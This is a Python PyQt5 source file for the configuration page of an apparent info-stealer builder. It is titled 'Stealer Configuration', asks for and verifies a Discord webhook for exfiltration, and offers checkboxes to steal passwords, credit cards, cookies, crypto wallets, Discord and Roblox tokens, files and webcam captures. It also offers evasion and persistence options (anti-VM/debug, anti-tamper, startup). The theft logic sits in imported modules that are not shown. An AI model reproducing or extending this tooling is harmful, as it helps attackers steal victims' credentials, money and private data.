import re

from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, 
    QCheckBox, QGroupBox, QScrollArea, QLineEdit, QPushButton
)
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QFont

from src.styles import webhook_group_style, SCROLL_STYLE
from src.pages.message_box import CustomMessageBox
from src.functions.tools import Tools

class OptionsPage(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(30, 30, 30, 30)
        
        title = QLabel("Stealer Configuration")
        title.setFont(QFont("Segoe UI", 18, QFont.Bold))
        title.setStyleSheet("color: #ff4444; margin-bottom: 10px;")
        
        webhook_group = QGroupBox("Webhook Configuration")
        webhook_group.setStyleSheet(webhook_group_style)

        webhook_layout = QHBoxLayout()
        webhook_layout.setContentsMargins(15, 20, 15, 15)
        
        self.webhook_input = QLineEdit()
        self.webhook_input.setPlaceholderText("Enter webhook URL...")
        self.webhook_input.setMinimumHeight(35)
        
        test_btn = QPushButton("verify")
        test_btn.setObjectName("testButton")
        test_btn.setFixedSize(80, 35)
        test_btn.clicked.connect(self.check_webhook)
        
        webhook_layout.addWidget(self.webhook_input)
        webhook_layout.addWidget(test_btn)
        webhook_group.setLayout(webhook_layout)
        
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setStyleSheet(SCROLL_STYLE)


        scroll_content = QWidget()
        scroll_layout = QVBoxLayout()
        scroll_layout.setSpacing(20)
        
        stealer_group = self.create_checkbox_group(
            "Stealer Options",
            [
                "System Info", "Credit Cards",
                "Game Launchers", "Passwords", "Extensions",
                "Wallets", "Cookies", "Files",
                "Apps", "History", "Webcam",
                "Roblox Cookies", "Downloads", "Screenshot",
                "Discord Tokens"
            ]
        )
        
        malware_group = self.create_checkbox_group(
            "Malware Options",
            [
                "Anti VM/Debug",
                "Anti-Tamper",
                "Startup",
            ]
        )
        
        scroll_layout.addWidget(stealer_group)
        scroll_layout.addWidget(malware_group)
        scroll_layout.addStretch()
        
        scroll_content.setLayout(scroll_layout)
        scroll.setWidget(scroll_content)
        
        main_layout.addWidget(title)
        main_layout.addWidget(webhook_group)
        main_layout.addWidget(scroll)
        
        self.setLayout(main_layout)

    def create_checkbox_group(self, title, options):
        group = QGroupBox(title)
        group.checkboxes = []
        group.setStyleSheet("""
            QGroupBox {
                font-size: 14px;
                font-weight: bold;
                color: #ff4444;
                border: 1px solid #2a2a2a;
                border-radius: 6px;
                margin-top: 10px;
                padding-top: 15px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px;
            }
        """)
        
        layout = QVBoxLayout()
        layout.setContentsMargins(15, 20, 15, 15)
        layout.setSpacing(12)
        
        grid_layout = QHBoxLayout()
        columns = [QVBoxLayout() for _ in range(3)]
        
        for i, option in enumerate(options):
            checkbox = QCheckBox(option)
            group.checkboxes.append(checkbox)
            columns[i % 3].addWidget(checkbox)
        
        for col in columns:
            col.addStretch()
            grid_layout.addLayout(col)
        
        layout.addLayout(grid_layout)
        group.setLayout(layout)
        
        return group

    def get_selected_options(self):
        selected = []
        for group in self.findChildren(QGroupBox):
            if hasattr(group, "checkboxes"):
                for cb in group.checkboxes:
                    if cb.isChecked():
                        selected.append(cb.text())
        return selected

    def check_webhook(self):
        webhook_url = self.webhook_input.text().strip()
        pattern = r"^https:\/\/discord\.com\/api\/webhooks\/\d+\/[\w-]+$"
        if not re.match(pattern, webhook_url):
            box = CustomMessageBox("😈", "Error", "Invalid Discord Webhook!")
            box.show()
            return
        
        r = Tools.send_webhook(webhook_url)
        if r[0]:
            box = CustomMessageBox("😈", "Successfully", r[1])
            box.show()
            return
